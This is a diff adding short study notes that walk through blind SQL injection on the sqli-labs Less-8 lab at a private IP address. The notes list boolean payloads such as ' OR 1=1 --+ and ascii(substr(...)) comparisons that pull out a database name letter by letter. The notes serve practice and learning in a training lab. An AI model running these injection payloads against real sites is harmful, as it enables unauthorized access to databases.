@@ -1,0 +1,37 @@
+Try to find a result:
+
+E.g: http://10.10.22.134/sqli-labs/Less-8/?id=1
+
+if you get a "True" as value. Try then to change 1 by 99999999 and 
+if you get a false(or just an empty page) that means the page is vulnb. by blind SQLi.
+
+
+Let's try to bypass the SQL query then:
+10.10.22.134/sqli-labs/Less-8/?id=1' OR 1 = 1 --+
+
+that should still give us a True value.
+
+What if we change like this:
+10.10.22.134/sqli-labs/Less-8/?id=1' OR 1 = 2 --+
+
+Then we should get a False result.
+
+Now that we can bypass the sql query, let's try to guess the database name by
+playing true or false.
+
+10.10.22.134/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()),1,1))) = 115 --+
+
+Here we are looking for the first letter of the database
+By using substr = 'substring', we ask the first letter of the database.
+ 
+
+http://www.asciitable.com/
+
+By using the ascii, we make our life easier.
+We can just use greater or less than the given ascii number.
+
+E.g.:
+10.10.22.134/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()),2,1))) < 101 --+
+
+here we check if the second letter of the database name is less than 101:
+that means if the second letter is above the letter "e"
